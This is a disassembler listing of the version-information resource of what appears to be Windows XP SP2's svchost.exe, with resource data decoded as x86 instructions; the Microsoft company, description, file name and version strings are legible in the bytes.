 1005043:	00 48 00             	add    %cl,0x0(%eax)
 1005046:	00 00                	add    %al,(%eax)
 1005048:	60                   	pusha
 1005049:	50                   	push   %eax
 100504a:	00 00                	add    %al,(%eax)
 100504c:	b8 03 00 00 00       	mov    $0x3,%eax
	...
 100505d:	00 00                	add    %al,(%eax)
 100505f:	00 b8 03 34 00 00    	add    %bh,0x3403(%eax)
 1005065:	00 56 00             	add    %dl,0x0(%esi)
 1005068:	53                   	push   %ebx
 1005069:	00 5f 00             	add    %bl,0x0(%edi)
 100506c:	56                   	push   %esi
 100506d:	00 45 00             	add    %al,0x0(%ebp)
 1005070:	52                   	push   %edx
 1005071:	00 53 00             	add    %dl,0x0(%ebx)
 1005074:	49                   	dec    %ecx
 1005075:	00 4f 00             	add    %cl,0x0(%edi)
 1005078:	4e                   	dec    %esi
 1005079:	00 5f 00             	add    %bl,0x0(%edi)
 100507c:	49                   	dec    %ecx
 100507d:	00 4e 00             	add    %cl,0x0(%esi)
 1005080:	46                   	inc    %esi
 1005081:	00 4f 00             	add    %cl,0x0(%edi)
 1005084:	00 00                	add    %al,(%eax)
 1005086:	00 00                	add    %al,(%eax)
 1005088:	bd 04 ef fe 00       	mov    $0xfeef04,%ebp
 100508d:	00 01                	add    %al,(%ecx)
 100508f:	00 01                	add    %al,(%ecx)
 1005091:	00 05 00 84 08 28    	add    %al,0x28088400
 1005097:	0a 01                	or     (%ecx),%al
 1005099:	00 05 00 84 08 28    	add    %al,0x28088400
 100509f:	0a 3f                	or     (%edi),%bh
 10050a1:	00 00                	add    %al,(%eax)
 10050a3:	00 00                	add    %al,(%eax)
 10050a5:	00 00                	add    %al,(%eax)
 10050a7:	00 04 00             	add    %al,(%eax,%eax,1)
 10050aa:	04 00                	add    $0x0,%al
 10050ac:	01 00                	add    %eax,(%eax)
	...
 10050ba:	00 00                	add    %al,(%eax)
 10050bc:	18 03                	sbb    %al,(%ebx)
 10050be:	00 00                	add    %al,(%eax)
 10050c0:	01 00                	add    %eax,(%eax)
 10050c2:	53                   	push   %ebx
 10050c3:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
 10050c7:	00 69 00             	add    %ch,0x0(%ecx)
 10050ca:	6e                   	outsb  %ds:(%esi),(%dx)
 10050cb:	00 67 00             	add    %ah,0x0(%edi)
 10050ce:	46                   	inc    %esi
 10050cf:	00 69 00             	add    %ch,0x0(%ecx)
 10050d2:	6c                   	insb   (%dx),%es:(%edi)
 10050d3:	00 65 00             	add    %ah,0x0(%ebp)
 10050d6:	49                   	dec    %ecx
 10050d7:	00 6e 00             	add    %ch,0x0(%esi)
 10050da:	66 00 6f 00          	data16 add %ch,0x0(%edi)
 10050de:	00 00                	add    %al,(%eax)
 10050e0:	f4                   	hlt
 10050e1:	02 00                	add    (%eax),%al
 10050e3:	00 01                	add    %al,(%ecx)
 10050e5:	00 30                	add    %dh,(%eax)
 10050e7:	00 34 00             	add    %dh,(%eax,%eax,1)
 10050ea:	30 00                	xor    %al,(%eax)
 10050ec:	39 00                	cmp    %eax,(%eax)
 10050ee:	30 00                	xor    %al,(%eax)
 10050f0:	34 00                	xor    $0x0,%al
 10050f2:	42                   	inc    %edx
 10050f3:	00 30                	add    %dh,(%eax)
 10050f5:	00 00                	add    %al,(%eax)
 10050f7:	00 4c 00 16          	add    %cl,0x16(%eax,%eax,1)
 10050fb:	00 01                	add    %al,(%ecx)
 10050fd:	00 43 00             	add    %al,0x0(%ebx)
 1005100:	6f                   	outsl  %ds:(%esi),(%dx)
 1005101:	00 6d 00             	add    %ch,0x0(%ebp)
 1005104:	70 00                	jo     0x1005106
 1005106:	61                   	popa
 1005107:	00 6e 00             	add    %ch,0x0(%esi)
 100510a:	79 00                	jns    0x100510c
 100510c:	4e                   	dec    %esi
 100510d:	00 61 00             	add    %ah,0x0(%ecx)
 1005110:	6d                   	insl   (%dx),%es:(%edi)
 1005111:	00 65 00             	add    %ah,0x0(%ebp)
 1005114:	00 00                	add    %al,(%eax)
 1005116:	00 00                	add    %al,(%eax)
 1005118:	4d                   	dec    %ebp
 1005119:	00 69 00             	add    %ch,0x0(%ecx)
 100511c:	63 00                	arpl   %eax,(%eax)
 100511e:	72 00                	jb     0x1005120
 1005120:	6f                   	outsl  %ds:(%esi),(%dx)
 1005121:	00 73 00             	add    %dh,0x0(%ebx)
 1005124:	6f                   	outsl  %ds:(%esi),(%dx)
 1005125:	00 66 00             	add    %ah,0x0(%esi)
 1005128:	74 00                	je     0x100512a
 100512a:	20 00                	and    %al,(%eax)
 100512c:	43                   	inc    %ebx
 100512d:	00 6f 00             	add    %ch,0x0(%edi)
 1005130:	72 00                	jb     0x1005132
 1005132:	70 00                	jo     0x1005134
 1005134:	6f                   	outsl  %ds:(%esi),(%dx)
 1005135:	00 72 00             	add    %dh,0x0(%edx)
 1005138:	61                   	popa
 1005139:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
 100513d:	00 6f 00             	add    %ch,0x0(%edi)
 1005140:	6e                   	outsb  %ds:(%esi),(%dx)
 1005141:	00 00                	add    %al,(%eax)
 1005143:	00 78 00             	add    %bh,0x0(%eax)
 1005146:	28 00                	sub    %al,(%eax)
 1005148:	01 00                	add    %eax,(%eax)
 100514a:	46                   	inc    %esi
 100514b:	00 69 00             	add    %ch,0x0(%ecx)
 100514e:	6c                   	insb   (%dx),%es:(%edi)
 100514f:	00 65 00             	add    %ah,0x0(%ebp)
 1005152:	44                   	inc    %esp
 1005153:	00 65 00             	add    %ah,0x0(%ebp)
 1005156:	73 00                	jae    0x1005158
 1005158:	63 00                	arpl   %eax,(%eax)
 100515a:	72 00                	jb     0x100515c
 100515c:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
 1005162:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
 1005168:	00 00                	add    %al,(%eax)
 100516a:	00 00                	add    %al,(%eax)
 100516c:	47                   	inc    %edi
 100516d:	00 65 00             	add    %ah,0x0(%ebp)
 1005170:	6e                   	outsb  %ds:(%esi),(%dx)
 1005171:	00 65 00             	add    %ah,0x0(%ebp)
 1005174:	72 00                	jb     0x1005176
 1005176:	69 00 63 00 20 00    	imul   $0x200063,(%eax),%eax
 100517c:	48                   	dec    %eax
 100517d:	00 6f 00             	add    %ch,0x0(%edi)
 1005180:	73 00                	jae    0x1005182
 1005182:	74 00                	je     0x1005184
 1005184:	20 00                	and    %al,(%eax)
 1005186:	50                   	push   %eax
 1005187:	00 72 00             	add    %dh,0x0(%edx)
 100518a:	6f                   	outsl  %ds:(%esi),(%dx)
 100518b:	00 63 00             	add    %ah,0x0(%ebx)
 100518e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
 1005192:	73 00                	jae    0x1005194
 1005194:	20 00                	and    %al,(%eax)
 1005196:	66 00 6f 00          	data16 add %ch,0x0(%edi)
 100519a:	72 00                	jb     0x100519c
 100519c:	20 00                	and    %al,(%eax)
 100519e:	57                   	push   %edi
 100519f:	00 69 00             	add    %ch,0x0(%ecx)
 10051a2:	6e                   	outsb  %ds:(%esi),(%dx)
 10051a3:	00 33                	add    %dh,(%ebx)
 10051a5:	00 32                	add    %dh,(%edx)
 10051a7:	00 20                	add    %ah,(%eax)
 10051a9:	00 53 00             	add    %dl,0x0(%ebx)
 10051ac:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
 10051b0:	76 00                	jbe    0x10051b2
 10051b2:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
 10051b8:	73 00                	jae    0x10051ba
 10051ba:	00 00                	add    %al,(%eax)
 10051bc:	72 00                	jb     0x10051be
 10051be:	29 00                	sub    %eax,(%eax)
 10051c0:	01 00                	add    %eax,(%eax)
 10051c2:	46                   	inc    %esi
 10051c3:	00 69 00             	add    %ch,0x0(%ecx)
 10051c6:	6c                   	insb   (%dx),%es:(%edi)
 10051c7:	00 65 00             	add    %ah,0x0(%ebp)
 10051ca:	56                   	push   %esi
 10051cb:	00 65 00             	add    %ah,0x0(%ebp)
 10051ce:	72 00                	jb     0x10051d0
 10051d0:	73 00                	jae    0x10051d2
 10051d2:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
 10051d8:	00 00                	add    %al,(%eax)
 10051da:	00 00                	add    %al,(%eax)
 10051dc:	35 00 2e 00 31       	xor    $0x31002e00,%eax
 10051e1:	00 2e                	add    %ch,(%esi)
 10051e3:	00 32                	add    %dh,(%edx)
 10051e5:	00 36                	add    %dh,(%esi)
 10051e7:	00 30                	add    %dh,(%eax)
 10051e9:	00 30                	add    %dh,(%eax)
 10051eb:	00 2e                	add    %ch,(%esi)
 10051ed:	00 32                	add    %dh,(%edx)
 10051ef:	00 31                	add    %dh,(%ecx)
 10051f1:	00 38                	add    %bh,(%eax)
 10051f3:	00 30                	add    %dh,(%eax)
 10051f5:	00 20                	add    %ah,(%eax)
 10051f7:	00 28                	add    %ch,(%eax)
 10051f9:	00 78 00             	add    %bh,0x0(%eax)
 10051fc:	70 00                	jo     0x10051fe
 10051fe:	73 00                	jae    0x1005200
 1005200:	70 00                	jo     0x1005202
 1005202:	5f                   	pop    %edi
 1005203:	00 73 00             	add    %dh,0x0(%ebx)
 1005206:	70 00                	jo     0x1005208
 1005208:	32 00                	xor    (%eax),%al
 100520a:	5f                   	pop    %edi
 100520b:	00 72 00             	add    %dh,0x0(%edx)
 100520e:	74 00                	je     0x1005210
 1005210:	6d                   	insl   (%dx),%es:(%edi)
 1005211:	00 2e                	add    %ch,(%esi)
 1005213:	00 30                	add    %dh,(%eax)
 1005215:	00 34 00             	add    %dh,(%eax,%eax,1)
 1005218:	30 00                	xor    %al,(%eax)
 100521a:	38 00                	cmp    %al,(%eax)
 100521c:	30 00                	xor    %al,(%eax)
 100521e:	33 00                	xor    (%eax),%eax
 1005220:	2d 00 32 00 31       	sub    $0x31003200,%eax
 1005225:	00 35 00 38 00 29    	add    %dh,0x29003800
 100522b:	00 00                	add    %al,(%eax)
 100522d:	00 00                	add    %al,(%eax)
 100522f:	00 38                	add    %bh,(%eax)
 1005231:	00 0c 00             	add    %cl,(%eax,%eax,1)
 1005234:	01 00                	add    %eax,(%eax)
 1005236:	49                   	dec    %ecx
 1005237:	00 6e 00             	add    %ch,0x0(%esi)
 100523a:	74 00                	je     0x100523c
 100523c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
 1005240:	6e                   	outsb  %ds:(%esi),(%dx)
 1005241:	00 61 00             	add    %ah,0x0(%ecx)
 1005244:	6c                   	insb   (%dx),%es:(%edi)
 1005245:	00 4e 00             	add    %cl,0x0(%esi)
 1005248:	61                   	popa
 1005249:	00 6d 00             	add    %ch,0x0(%ebp)
 100524c:	65 00 00             	add    %al,%gs:(%eax)
 100524f:	00 73 00             	add    %dh,0x0(%ebx)
 1005252:	76 00                	jbe    0x1005254
 1005254:	63 00                	arpl   %eax,(%eax)
 1005256:	68 00 6f 00 73       	push   $0x73006f00
 100525b:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
 100525f:	00 65 00             	add    %ah,0x0(%ebp)
 1005262:	78 00                	js     0x1005264
 1005264:	65 00 00             	add    %al,%gs:(%eax)
 1005267:	00 80 00 2e 00 01    	add    %al,0x1002e00(%eax)
 100526d:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
 1005271:	00 67 00             	add    %ah,0x0(%edi)
 1005274:	61                   	popa
 1005275:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
 1005279:	00 6f 00             	add    %ch,0x0(%edi)
 100527c:	70 00                	jo     0x100527e
 100527e:	79 00                	jns    0x1005280
 1005280:	72 00                	jb     0x1005282
 1005282:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
 1005288:	74 00                	je     0x100528a
 100528a:	00 00                	add    %al,(%eax)
 100528c:	a9 00 20 00 4d       	test   $0x4d002000,%eax
 1005291:	00 69 00             	add    %ch,0x0(%ecx)
 1005294:	63 00                	arpl   %eax,(%eax)
 1005296:	72 00                	jb     0x1005298
 1005298:	6f                   	outsl  %ds:(%esi),(%dx)
 1005299:	00 73 00             	add    %dh,0x0(%ebx)
 100529c:	6f                   	outsl  %ds:(%esi),(%dx)
 100529d:	00 66 00             	add    %ah,0x0(%esi)
 10052a0:	74 00                	je     0x10052a2
 10052a2:	20 00                	and    %al,(%eax)
 10052a4:	43                   	inc    %ebx
 10052a5:	00 6f 00             	add    %ch,0x0(%edi)
 10052a8:	72 00                	jb     0x10052aa
 10052aa:	70 00                	jo     0x10052ac
 10052ac:	6f                   	outsl  %ds:(%esi),(%dx)
 10052ad:	00 72 00             	add    %dh,0x0(%edx)
 10052b0:	61                   	popa
 10052b1:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
 10052b5:	00 6f 00             	add    %ch,0x0(%edi)
 10052b8:	6e                   	outsb  %ds:(%esi),(%dx)
 10052b9:	00 2e                	add    %ch,(%esi)
 10052bb:	00 20                	add    %ah,(%eax)
 10052bd:	00 41 00             	add    %al,0x0(%ecx)
 10052c0:	6c                   	insb   (%dx),%es:(%edi)
 10052c1:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
 10052c5:	00 72 00             	add    %dh,0x0(%edx)
 10052c8:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
 10052ce:	74 00                	je     0x10052d0
 10052d0:	73 00                	jae    0x10052d2
 10052d2:	20 00                	and    %al,(%eax)
 10052d4:	72 00                	jb     0x10052d6
 10052d6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
 10052da:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
 10052de:	76 00                	jbe    0x10052e0
 10052e0:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%eax,%eax,1)
 10052e5:	00 00                	add    %al,(%eax)
 10052e7:	00 40 00             	add    %al,0x0(%eax)
 10052ea:	0c 00                	or     $0x0,%al
 10052ec:	01 00                	add    %eax,(%eax)
 10052ee:	4f                   	dec    %edi
 10052ef:	00 72 00             	add    %dh,0x0(%edx)
 10052f2:	69 00 67 00 69 00    	imul   $0x690067,(%eax),%eax
 10052f8:	6e                   	outsb  %ds:(%esi),(%dx)
 10052f9:	00 61 00             	add    %ah,0x0(%ecx)
 10052fc:	6c                   	insb   (%dx),%es:(%edi)
 10052fd:	00 46 00             	add    %al,0x0(%esi)
 1005300:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
 1005306:	6e                   	outsb  %ds:(%esi),(%dx)
 1005307:	00 61 00             	add    %ah,0x0(%ecx)
 100530a:	6d                   	insl   (%dx),%es:(%edi)
 100530b:	00 65 00             	add    %ah,0x0(%ebp)
 100530e:	00 00                	add    %al,(%eax)
 1005310:	73 00                	jae    0x1005312
 1005312:	76 00                	jbe    0x1005314
 1005314:	63 00                	arpl   %eax,(%eax)
 1005316:	68 00 6f 00 73       	push   $0x73006f00
 100531b:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
 100531f:	00 65 00             	add    %ah,0x0(%ebp)
 1005322:	78 00                	js     0x1005324
 1005324:	65 00 00             	add    %al,%gs:(%eax)
 1005327:	00 6a 00             	add    %ch,0x0(%edx)
 100532a:	25 00 01 00 50       	and    $0x50000100,%eax
 100532f:	00 72 00             	add    %dh,0x0(%edx)
 1005332:	6f                   	outsl  %ds:(%esi),(%dx)
 1005333:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
 1005337:	00 63 00             	add    %ah,0x0(%ebx)
 100533a:	74 00                	je     0x100533c
 100533c:	4e                   	dec    %esi
 100533d:	00 61 00             	add    %ah,0x0(%ecx)
 1005340:	6d                   	insl   (%dx),%es:(%edi)
 1005341:	00 65 00             	add    %ah,0x0(%ebp)
 1005344:	00 00                	add    %al,(%eax)
 1005346:	00 00                	add    %al,(%eax)
 1005348:	4d                   	dec    %ebp
 1005349:	00 69 00             	add    %ch,0x0(%ecx)
 100534c:	63 00                	arpl   %eax,(%eax)
 100534e:	72 00                	jb     0x1005350
 1005350:	6f                   	outsl  %ds:(%esi),(%dx)
 1005351:	00 73 00             	add    %dh,0x0(%ebx)
 1005354:	6f                   	outsl  %ds:(%esi),(%dx)
 1005355:	00 66 00             	add    %ah,0x0(%esi)
 1005358:	74 00                	je     0x100535a
 100535a:	ae                   	scas   %es:(%edi),%al
 100535b:	00 20                	add    %ah,(%eax)
 100535d:	00 57 00             	add    %dl,0x0(%edi)
 1005360:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
 1005366:	6f                   	outsl  %ds:(%esi),(%dx)
 1005367:	00 77 00             	add    %dh,0x0(%edi)
 100536a:	73 00                	jae    0x100536c
 100536c:	ae                   	scas   %es:(%edi),%al
 100536d:	00 20                	add    %ah,(%eax)
 100536f:	00 4f 00             	add    %cl,0x0(%edi)
 1005372:	70 00                	jo     0x1005374
 1005374:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
 1005378:	61                   	popa
 1005379:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
 100537d:	00 6e 00             	add    %ch,0x0(%esi)
 1005380:	67 00 20             	add    %ah,(%bx,%si)
 1005383:	00 53 00             	add    %dl,0x0(%ebx)
 1005386:	79 00                	jns    0x1005388
 1005388:	73 00                	jae    0x100538a
 100538a:	74 00                	je     0x100538c
 100538c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
 1005390:	00 00                	add    %al,(%eax)
 1005392:	00 00                	add    %al,(%eax)
 1005394:	40                   	inc    %eax
 1005395:	00 0e                	add    %cl,(%esi)
 1005397:	00 01                	add    %al,(%ecx)
 1005399:	00 50 00             	add    %dl,0x0(%eax)
 100539c:	72 00                	jb     0x100539e
 100539e:	6f                   	outsl  %ds:(%esi),(%dx)
 100539f:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
 10053a3:	00 63 00             	add    %ah,0x0(%ebx)
 10053a6:	74 00                	je     0x10053a8
 10053a8:	56                   	push   %esi
 10053a9:	00 65 00             	add    %ah,0x0(%ebp)
 10053ac:	72 00                	jb     0x10053ae
 10053ae:	73 00                	jae    0x10053b0
 10053b0:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
 10053b6:	00 00                	add    %al,(%eax)
 10053b8:	35 00 2e 00 31       	xor    $0x31002e00,%eax
 10053bd:	00 2e                	add    %ch,(%esi)
 10053bf:	00 32                	add    %dh,(%edx)
 10053c1:	00 36                	add    %dh,(%esi)
 10053c3:	00 30                	add    %dh,(%eax)
 10053c5:	00 30                	add    %dh,(%eax)
 10053c7:	00 2e                	add    %ch,(%esi)
 10053c9:	00 32                	add    %dh,(%edx)
 10053cb:	00 31                	add    %dh,(%ecx)
 10053cd:	00 38                	add    %bh,(%eax)
 10053cf:	00 30                	add    %dh,(%eax)
 10053d1:	00 00                	add    %al,(%eax)
 10053d3:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
 10053d7:	00 01                	add    %al,(%ecx)
 10053d9:	00 56 00             	add    %dl,0x0(%esi)
 10053dc:	61                   	popa
 10053dd:	00 72 00             	add    %dh,0x0(%edx)
 10053e0:	46                   	inc    %esi
 10053e1:	00 69 00             	add    %ch,0x0(%ecx)
 10053e4:	6c                   	insb   (%dx),%es:(%edi)
 10053e5:	00 65 00             	add    %ah,0x0(%ebp)
 10053e8:	49                   	dec    %ecx
 10053e9:	00 6e 00             	add    %ch,0x0(%esi)
 10053ec:	66 00 6f 00          	data16 add %ch,0x0(%edi)
 10053f0:	00 00                	add    %al,(%eax)
 10053f2:	00 00                	add    %al,(%eax)
 10053f4:	24 00                	and    $0x0,%al
 10053f6:	04 00                	add    $0x0,%al
 10053f8:	00 00                	add    %al,(%eax)
 10053fa:	54                   	push   %esp
 10053fb:	00 72 00             	add    %dh,0x0(%edx)
 10053fe:	61                   	popa
 10053ff:	00 6e 00             	add    %ch,0x0(%esi)
 1005402:	73 00                	jae    0x1005404
 1005404:	6c                   	insb   (%dx),%es:(%edi)
 1005405:	00 61 00             	add    %ah,0x0(%ecx)
 1005408:	74 00                	je     0x100540a
 100540a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
 1005410:	00 00                	add    %al,(%eax)
 1005412:	00 00                	add    %al,(%eax)
 1005414:	09 04 b0             	or     %eax,(%eax,%esi,4)
 1005417:	04                   	.byte 0x4
